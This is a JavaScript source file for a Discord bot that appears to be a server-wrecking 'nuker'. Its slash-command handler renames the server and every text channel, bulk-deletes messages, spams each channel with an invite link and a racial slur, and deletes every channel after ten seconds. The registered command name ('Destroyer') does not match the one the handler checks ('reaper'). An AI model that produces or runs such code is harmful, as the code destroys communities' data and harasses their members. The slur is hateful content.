const { SlashCommandBuilder } = require('@discordjs/builders');
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v9');
const { Client, Intents } = require('discord.js');
const { token } = require('./config.json'); // Store your bot token in a config.json file

const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

const commands = [
    new SlashCommandBuilder()
        .setName('Destroyer')
        .setDescription('Destroys the server.')
].map(command => command.toJSON());

const rest = new REST({ version: '9' }).setToken(token);

(async () => {
    try {
        console.log('Started refreshing application (/) commands.');

        await rest.put(
            Routes.applicationGuildCommands('YOUR_CLIENT_ID', 'YOUR_GUILD_ID'), // Replace with your client and guild IDs
            { body: commands },
        );

        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
})();

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'reaper') {
        await interaction.reply('Executing Reaper Protocol...');

        // Change channel name
        try {
            await interaction.guild.channels.cache.forEach(channel => {
                if (channel.type === 'GUILD_TEXT') {
                    channel.setName('gg-reaper').catch(console.error);
                }
            });
        } catch (error) {
            console.error('Error changing channel names:', error);
        }


        // Delete all messages
        try {
            await interaction.guild.channels.cache.forEach(async channel => {
                if (channel.type === 'GUILD_TEXT') {
                    try {
                        let messages = await channel.messages.fetch({ limit: 100 }); // Fetching only 100 messages at a time to prevent errors.
                        await channel.bulkDelete(messages, true); // Bulk delete
                        console.log(`Successfully deleted messages in ${channel.name}`);
                    } catch (error) {
                        console.error(`Error deleting messages in ${channel.name}:`, error);
                    }
                }
            });
        } catch (error) {
            console.error('Error deleting messages:', error);
        }

        // Change server name
        try {
            await interaction.guild.setName('gg-reaper').catch(console.error);
        } catch (error) {
            console.error('Error changing server name:', error);
        }

        // Spam all channels
        const spamMessage = 'https://discord.gg/TqFhzjmyjx on top lil nigga';
        try {
            await interaction.guild.channels.cache.forEach(channel => {
                if (channel.type === 'GUILD_TEXT') {
                    for (let i = 0; i < 5; i++) { // Reduced spam count for safety
                        channel.send(spamMessage).catch(console.error);
                    }
                }
            });
        } catch (error) {
            console.error('Error spamming channels:', error);
        }


        // Delete all channels after 10 seconds
        setTimeout(() => {
            try {
                interaction.guild.channels.cache.forEach(channel => {
                    channel.delete().catch(console.error);
                });
            } catch (error) {
                console.error('Error deleting channels:', error);
            }
        }, 10000);
    }
});

client.login(token);
